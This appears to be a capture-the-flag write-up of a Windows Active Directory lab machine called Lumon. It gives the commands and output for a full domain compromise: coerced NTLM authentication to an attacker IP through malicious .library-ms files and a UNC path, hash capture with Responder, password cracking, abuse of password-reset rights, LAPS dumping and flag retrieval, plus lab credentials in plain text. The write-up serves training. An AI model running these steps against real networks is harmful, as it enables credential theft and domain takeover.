---
layout: post
title: "Lumon (Medium) — Hack The Box"
date: 2026-02-05 22:00:00 +0100
categories:
  - Writeups
  - HackSmarter
tags:
  - Lumon
  - medium
  - Windows
  - ActiveDirectory
  - llmnr 
  - PrivEsc
image: assets/img/Writeup/Hacksmarter/Lumon/lumon.png
published: true
description: Medium Windows Machine Writeup by Uzurly

---


## Objective / Scope

Lumon Industries will soon be integrating a high-value employee into the organization. In accordance with internal security protocols, a comprehensive penetration test and internal access verification must be conducted prior to full onboarding.

For the purposes of this evaluation, you will be provided the assigned credentials and access permissions corresponding to the subject employee. Your objective is to assess the scope and boundaries of these permissions, ensuring compliance with all Lumon security standards and operational safeguards.

#### [Starting Credentials](https://www.hacksmarter.org/courses/a952a025-4b22-47cd-bd75-d92cf5e524e9/take#user-content-starting-credentials)

```
hellyr:H3lenaR!2025
```
## Nmap TCP Summary

### DC01.lumons.hacksmarter (10.1.42.32)

| Port | Service | Description |
|------|--------|-------------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Active Directory Authentication |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | NetBIOS Session Service |
| 389 | LDAP | Active Directory LDAP |
| 445 | SMB | Microsoft-DS |
| 464 | kpasswd | Kerberos Password Change |
| 593 | RPC | RPC over HTTP |
| 636 | LDAPS | Secure LDAP |
| 3268 | LDAP GC | Global Catalog |
| 3269 | LDAPS GC | Secure Global Catalog |
| 3389 | RDP | Remote Desktop |



### Intranet.lumons.hacksmarter (10.1.239.192)

| Port | Service | Description |
|------|--------|-------------|
| 80 | HTTP | IIS 10.0 (redirect to HTTPS) |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | NetBIOS Session Service |
| 443 | HTTPS | IIS 10.0 |
| 445 | SMB | Microsoft-DS |
| 3389 | RDP | Remote Desktop |

---

## SMB Enumeration
### Generating a Hosts File with NetExec (nxc)
 To ensure proper hostname resolution, we use NetExec  to automatically generate hosts file entries for the identified systems.

```
nxc smb 10.1.239.192 --generate-hosts-file hosts
```
```
 nxc smb 10.1.42.32 --generate-hosts-file hosts2
```

![1](/assets/img/Writeup/Hacksmarter/Lumon/1.png)

 The generated information was then manually added to the local /etc/hosts file to guarantee consistent name resolution during subsequent attacks and enumeration steps.

```
 echo '10.1.239.192     INTRANET.lumons.hacksmarter INTRANET' >> /etc/hosts
 echo '10.1.42.32     DC01.lumons.hacksmarter lumons.hacksmarter DC01' >> /etc/hosts
```
 For convenience, both target IP addresses were stored in a file for bulk enumeration.

````
[🔴][Feb 03, 2026 - 00:41:55 (CET)] exegol-htb Lumon # cat ips
10.1.42.32
10.1.239.192
[🔴][Feb 03, 2026 - 00:42:02 (CET)] exegol-htb Lumon #
````
### Enumerating SMB Shares
#### Using valid domain credentials, SMB enumeration was performed against both hosts simultaneously.

```
nxc smb ips -u hellyr -p 'H3lenaR!2025'
```
#### To enumerate available SMB shares and their permissions, the --shares option was used.
```
nxc smb ips -u hellyr -p 'H3lenaR!2025' --shares
```
![2](/assets/img/Writeup/Hacksmarter/Lumon/2.png)

 This revealed at least one non-default SMB share with write permissions, which is often a strong indicator of potential lateral movement or credential harvesting opportunities.

---

## LLMNR / SMB Exploitation Attempt

#### Discovering write access on a non-default SMB share raised the possibility of placing a malicious file (such as a .lnk shortcut) to trigger outbound authentication and capture credentials via NTLM relay or hash capture.

#### An initial attempt was made to capture authentication traffic using Responder and ntlm-theft .

```
ntlm_theft.py --verbose --generate modern --server "10.200.33.160" --filename "meetingXYZ"
```

```
responder -I tun0
```
#### However, this approach did not immediately yield results.

 Recently disclosed vulnerabilities involving malicious shortcut files provide alternative exploitation paths. In particular, the following proof of concept demonstrates how crafted files can be abused to trigger authentication attempts:

- #### [helidem](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC)

```
[🔴][Feb 04, 2026 - 03:56:30 (CET)] exegol-htb CVE-2025-24054_CVE-2025-24071-PoC # python3 exploit.py
Enter attacker IP or hostname: 10.200.33.160
[+] File xd.library-ms successfully generated, pointing to \\10.200.33.160\share
[🔴][Feb 04, 2026 - 03:56:37 (CET)] exegol-htb CVE-2025-24054_CVE-2025-24071-PoC #

```
![3](/assets/img/Writeup/Hacksmarter/Lumon/3.png)


```
 smbclient.py "lumons.hacksmarter"/"hellyr":'H3lenaR!2025'@"10.1.239.192"
```

![5](/assets/img/Writeup/Hacksmarter/Lumon/5.png)

On the responder we got a hit.

![6](/assets/img/Writeup/Hacksmarter/Lumon/6.png)

### NTLM Hash Cracking

The captured NTLM hash was saved to a file (hash.txt) and cracked using John the Ripper with the RockYou wordlist.

For convenience, a custom ZSH alias was used to simplify hash cracking:
```
# Hashcracking
rock_john() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: rock_john wordlist (options)"
    else
      john "${@}" --wordlist=/usr/share/wordlists/rockyou.txt
  fi
}
```

![7](/assets/img/Writeup/Hacksmarter/Lumon/7.png)


After running John, the plaintext password was successfully recovered:

- User: harmonyc

- Password: h@rmony08

## Harmonyc User 
### Verifying SMB Access with New Credentials

The newly cracked credentials were validated against the INTRANET host.

```
nxc smb 10.1.239.192 -u harmonyc -p 'pass.txt' 
```

To enumerate accessible SMB shares and permissions, the following command was executed:

```
nxc smb 10.1.239.192 -u harmonyc -p 'pass.txt' --shares
```

![8](/assets/img/Writeup/Hacksmarter/Lumon/8.png)


### enumerating users with nxc  on the dc01

```
nxc smb 10.1.42.32 -u harmonyc -p 'pass.txt' --users
```
![9](/assets/img/Writeup/Hacksmarter/Lumon/9.png)



### ldap collectiong whit nxc for bloodhound 


```
nxc ldap 10.1.42.32 -u harmonyc -p 'pass.txt' -c all --bloodhound --dns-server 10.1.42.32
```
![10](/assets/img/Writeup/Hacksmarter/Lumon/10.png)


### Bloodhound Enumeration

The collected data was imported into BloodHound to analyze privilege relationships and potential attack paths.

![11](/assets/img/Writeup/Hacksmarter/Lumon/11.png)

### Web Application Authentication

During earlier enumeration, a web service was identified on the INTRANET host.

```
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://intranet.lumons.hacksmarter/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Using the compromised credentials, authentication was attempted on the intranet web application.

![13](/assets/img/Writeup/Hacksmarter/Lumon/13.png)
Authentication was successful, granting access to an administrative interface.


![14](/assets/img/Writeup/Hacksmarter/Lumon/14.png)

## IntranetSvc User
### Credential Capture via Web Interface


By supplying a UNC path pointing to the attacker-controlled machine, the application was forced to authenticate externally.

---

on the admin panel we can browse smb shares lets re use our responder and put our ip like that
![15](/assets/img/Writeup/Hacksmarter/Lumon/15.png)

```
\\10.200.33.160\a
```

This resulted in a successful NTLM authentication capture using Responder.

![16](/assets/img/Writeup/Hacksmarter/Lumon/16.png)

### Cracking the Captured NTLM Hash

The captured NetNTLMv2 hash was saved locally and cracked using John the Ripper with the RockYou wordlist.

```
nano hash.txt
[🔴][Feb 04, 2026 - 04:37:02 (CET)] exegol-htb Lumon # rock_john hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Servicesince1979 (IntranetSvc)
1g 0:00:00:04 DONE (2026-02-04 04:37) 0.2033g/s 2157Kp/s 2157Kc/s 2157KC/s Shanel1..Sabersire
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
The following credentials were recovered:

- User: IntranetSvc

- Password: Servicesince1979

## Privilege Escalation on Intranet 
### BloodHound Analysis of IntranetSvc

The newly compromised IntranetSvc account was analyzed in BloodHound.

This account was found to have multiple outbound control edges, including:

- ForceChangePassword permissions over several domain users

Such permissions allow direct password resets without knowing the current password.

### Identifying LAPS Privileged Users

Among the affected users, mark and peterk were members of the LAPSAdmins group.

Membership in this group typically grants the ability to read Local Administrator Password Solution (LAPS) passwords.

The account mark was enabled, making it the most viable target for privilege escalation.

![17](/assets/img/Writeup/Hacksmarter/Lumon/17.png)

![19](/assets/img/Writeup/Hacksmarter/Lumon/19.png)

The account mark was enabled, making it the most viable target for privilege escalation.

![18](/assets/img/Writeup/Hacksmarter/Lumon/18.png)

### Abusing Password Reset Permissions

Using the IntranetSvc account, the password of the user mark was reset via bloodyAD.

```
[🔴][Feb 04, 2026 - 04:37:10 (CET)] exegol-htb Lumon # bloodyAD --host 10.1.42.32 -d lumons.hacksmarter -u intranetsvc -p 'Servicesince1979' set password marks Password123
```
This provided access to a LAPS-privileged account.

--- 

### Dumping LAPS Credentials

With control over the mark account, the LAPS module in NetExec was used to retrieve local administrator passwords.
```
nxc ldap 10.1.42.32 -u marks -p 'Password123' -M laps
```
![20](/assets/img/Writeup/Hacksmarter/Lumon/20.png)
This revealed the local administrator password for the INTRANET host.

###  Local Administrator Access and Post-Exploitation

Using the recovered LAPS credentials, local administrator access was obtained on the INTRANET system.

This level of access allows full system compromise, including credential dumping and further domain escalation opportunities.
```
[🔴][Feb 04, 2026 - 06:06:25 (CET)] exegol-htb Lumon # nxc smb 10.1.239.192 -u localadmin -p 'AlienSwayPlotRerunLivedElude' --local-auth --ntds
```
![21](/assets/img/Writeup/Hacksmarter/Lumon/21.png)
However, this method failed due to insufficient privileges or NTDS protection mechanisms.

---

## Privilege Escalation via RDP

Since RDP was available on the INTRANET host, an interactive session was established.

From the RDP session, the mark account was manually added to the local Administrators group using the command line.

Group membership was verified with:

![22](/assets/img/Writeup/Hacksmarter/Lumon/22.png)

after adding mark successfully on Administrators group we can verify it by typing net user localgroups like this 
```
net localgroup Administrators
```
![23](/assets/img/Writeup/Hacksmarter/Lumon/23.png)

### Cracking Domain Administrator Credentials

The cached MSCachev2 hash for hellye was extracted  using nxc and cracked using John the Ripper.
and we got the hash for helly whos she admin on the dc01

![24](/assets/img/Writeup/Hacksmarter/Lumon/24.png)


and we got the hash for hellye who's an admin on the DC01

let's crack the hash of helly and then connect to grab the last flag 
```
[🔴][Feb 04, 2026 - 06:25:09 (CET)] exegol-htb Lumon # nano hash.txt
[🔴][Feb 04, 2026 - 06:25:58 (CET)] exegol-htb Lumon # rock_john hash.txt
Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
Use the "--format=HMAC-MD5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 128/128 SSE2 4x])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Security&system  (?)
1g 0:00:02:09 DONE (2026-02-04 06:28) 0.007732g/s 16178p/s 16178c/s 16178C/s SexySpice..Scorpio20
Use the "--show --format=mscash2" options to display all of the cracked passwords reliably
Session completed.
```
### Retrieving the Final Flag

With Domain Admin access confirmed, the final flag was retrieved directly from the domain controller using SMB.
```
[🔴][Feb 04, 2026 - 06:33:47 (CET)] exegol-htb Lumon # nxc smb 10.1.42.32 -u hellye -p 'Security&system' --get-file \\Users\\Administrator\\Desktop\\root.txt root.txt
SMB         10.1.42.32      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:lumons.hacksmarter) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.42.32      445    DC01             [+] lumons.hacksmarter\hellye:Security&system (admin)
SMB         10.1.42.32      445    DC01             [*] Copying "\Users\Administrator\Desktop\root.txt" to "root.txt"
SMB         10.1.42.32      445    DC01             [+] File "\Users\Administrator\Desktop\root.txt" was downloaded to "root.tx
```
![27](/assets/img/Writeup/Hacksmarter/Lumon/27.png)
